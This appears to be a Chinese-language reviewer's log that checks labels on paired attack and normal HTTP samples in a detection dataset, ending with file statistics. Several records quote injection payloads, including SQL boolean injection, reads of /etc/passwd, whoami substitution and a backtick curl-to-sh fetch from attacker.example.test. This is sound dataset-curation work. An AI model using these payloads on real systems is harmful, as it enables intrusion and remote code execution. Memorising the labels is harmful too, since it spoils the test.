+样例 ID：HTTP-SQLI-03-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：40e83f75057c1109d5a79d7d3fa26dcc05b2961bb76ebbc1269eafffb833654c
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/orders/lookup 的 JSON 体（第 91 行）
+
+主审结论：agree
+
+输入来源：JSON 体 order_id、note。
+输入经过的处理过程：JSON 解析；order_id=1001，
+note="Please deliver after 6pm, I need to sleep in."。
+最终输出位置或危险操作：无源码；普通订单备注。
+已有防护及其适用范围：不适用。
+
+判断理由：note 里有 sleep 单词，但没有任何 SQL 函数调用或运算符；作为"关键词无调用"的正常对照
+成立（normal_counterpart=keyword_without_call）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-04-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：713ca3453390c5fa559ae76f90d7ba0abe8adb2c3c0e80398327addcd07d95d5
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：Cookie 头 tracking_id（第 96 行）
+
+主审结论：agree
+
+输入来源：Cookie 头。
+输入经过的处理过程：无 URL 编码（Cookie 原值），tracking_id=42' AND '1'='1。
+最终输出位置或危险操作：无源码；SQL 特征位于 Cookie 值。
+已有防护及其适用范围：不适用。
+
+判断理由：数字后单引号闭合再接 AND 恒真，是布尔盲注形态；与 technique=boolean_and 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 Cookie tracking_id 与 anchor 42' AND '1'='1
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-04-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：92582bb7bd6c6aad7bf0dd41f5b5e828a41b8093920aa294e2c960cf18f5cebb
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：Cookie 头（第 102 行）
+
+主审结论：agree
+
+输入来源：Cookie 头。
+输入经过的处理过程：无编码，theme=dark; tracking_id=42; lang=en-GB。
+最终输出位置或危险操作：无源码；普通站点偏好 Cookie。
+已有防护及其适用范围：不适用。
+
+判断理由：三个键值都是普通配置值，没有引号/SQL 运算符；作为"普通 Cookie"的正常对照成立
+（normal_counterpart=ordinary_cookies）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-01-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：db46c82740c88f6a4642729dd702ac6c1f5eb76e6ed0082191719c3154cd9dba
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：GET /tools/ping 的查询参数 host（第 106 行）
+
+主审结论：agree
+
+输入来源：查询参数 host。
+输入经过的处理过程：URL 一次解码，得到 127.0.0.1;cat /etc/passwd。
+最终输出位置或危险操作：无源码；命令注入特征位于 host。
+已有防护及其适用范围：不适用。
+
+判断理由：分号后执行 cat 读取 /etc/passwd，是命令连接注入的标准载荷；与 technique=semicolon_chain 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 host 参数与 anchor %3Bcat%20
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-01-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：f0c5640002c2e184a0a8b2332c848a484ae0480b57a53c47004d2d278880301a
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /tools/ping 的查询参数 host（第 111 行）
+
+主审结论：agree
+
+输入来源：查询参数 host。
+输入经过的处理过程：URL 解码，得到 db-replica-2.internal.example.test。
+最终输出位置或危险操作：无源码；普通主机名。
+已有防护及其适用范围：不适用。
+
+判断理由：合法主机名（字母、数字、点、连字符），没有分隔符；作为"主机名"的正常对照成立
+（normal_counterpart=hostname）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-02-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：f97f601c5c835bd35fce43a2d7d3d08655de6f57eaf3377c76c70a223110fe5b
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：POST /reports/export 的表单字段 name（第 120 行请求体）
+
+主审结论：agree
+
+输入来源：application/x-www-form-urlencoded 的 name。
+输入经过的处理过程：URL 解码，得到 q3-report$(whoami)。
+最终输出位置或危险操作：无源码；命令替换特征位于 name。
+已有防护及其适用范围：不适用。
+
+判断理由：$() 是 shell 命令替换，先执行 whoami 再把输出拼入命令，属命令注入；
+与 technique=command_substitution 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 name 字段与 anchor %24%28whoami%29
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-02-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：ddfac422a142849612c43a61caba04055f64af05a6ef5d59b84ff203db330473
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /reports/export 的表单体（第 127 行）
+
+主审结论：agree
+
+输入来源：表单字段 name、format、note。
+输入经过的处理过程：URL 解码，得到 name=q3-report、format=pdf、note=Budget $10k approved。
+最终输出位置或危险操作：无源码；普通导出参数与备注。
+已有防护及其适用范围：不适用。
+
+判断理由：$ 只是美元金额符号，没有 $() 或 ${} 结构；作为"美元金额"的正常对照成立
+（normal_counterpart=dollar_amount）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-03-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：6388bcc767afe3c4c0f319b2bfa966a4f9c90658c94bc7a4e50d6b5b3bb0ea43
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：POST /api/hooks 的 JSON 字段 branch（第 134 行请求体）
+
+主审结论：agree
+
+输入来源：JSON 体 branch。
+输入经过的处理过程：JSON 解析，得到 main`curl http://attacker.example.test/x.sh|sh`。
+最终输出位置或危险操作：无源码；命令替换特征位于 branch。
+已有防护及其适用范围：不适用。
+
+判断理由：反引号执行 curl 并把下载内容管道给 sh，是远程命令执行载荷；与
+technique=backtick_substitution 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 branch 字段与 anchor `curl http
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-03-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：39fa866d0eed1bf674fbbb9d7123a0c5d66da511081e992dbc376ce695996a50
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/hooks 的 JSON 体（第 141 行）
+
+主审结论：agree
+
+输入来源：JSON 体 branch、notify、comment。
+输入经过的处理过程：JSON 解析；branch=main，comment="Run `npm install` before building"。
+最终输出位置或危险操作：无源码；普通构建说明。
+已有防护及其适用范围：不适用。
+
+判断理由：反引号只用于 Markdown 行内代码，内容是 npm install 且位于 comment 字段，不是 branch；
+作为"Markdown 反引号"的正常对照成立（family 明确标注这是预期的规则误报负例）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：只有在 comment 不被 shell 解释时才是正常请求；请求级检测应结合字段语义，
+不能只看反引号
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-04-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：fedd7b514a99f6f5295a37b5a7d13afd8bedc936e68949eda06a4cc09fc8d1af
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：请求头 User-Agent（第 146 行）
+
+主审结论：agree
+
+输入来源：User-Agent 请求头。
+输入经过的处理过程：无编码，原样为 monitor/1.0 && id。
+最终输出位置或危险操作：无源码；命令注入特征位于 UA。
+已有防护及其适用范围：不适用。
+
+判断理由：&& 是 shell 条件连接，id 在监控 UA 后执行；与 technique=and_chain 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 User-Agent 头与 anchor && id
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-04-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：4e2460dda975340a29328cae0939fc17e5c1a20aa134acc03c5f749270979a81
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：请求头 User-Agent（第 152 行）
+
+主审结论：agree
+
+输入来源：User-Agent 请求头。
+输入经过的处理过程：无编码，monitor/1.0 (compatible; uptime-check)。
+最终输出位置或危险操作：无源码；普通监控 UA。
+已有防护及其适用范围：不适用。
+
+判断理由：括号和分号是 UA 注释语法，没有命令连接符后接命令名；作为"UA 含分号"的正常对照成立
+（normal_counterpart=semicolon_in_user_agent）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+九、本文件统计
+====================================================================
+- 记录总数 180：源码 120（V 60 / S 60），HTTP 60（A 30 / N 30）。
+- 结论分布：agree 179；disagree 1（SRC-XSS-03-V，仅 CWE 类别，建议 CWE-1336）；
+  uncertain 0。
+- 标签建议：179 条"保持原标签"，0 条建议改 vulnerable/safe/attack/normal；
+  1 条保留 vulnerable 但调整 CWE。
+- 行号建议：60 个 V 样例的 anchor 全部与 manifest.lines 匹配，0 条改行号；
+  S 样例的 lines/anchor 为 null，保持。
+- HTTP：60 条全部 agree，位置与 anchor 均能对应到请求行/头/字段；N 样例的 cwe=null 保持。
+- 唯一不同意项已进入《问题清单.txt》Q1，需要组长确认评分时是否接受 CWE-1336 或双标。
+
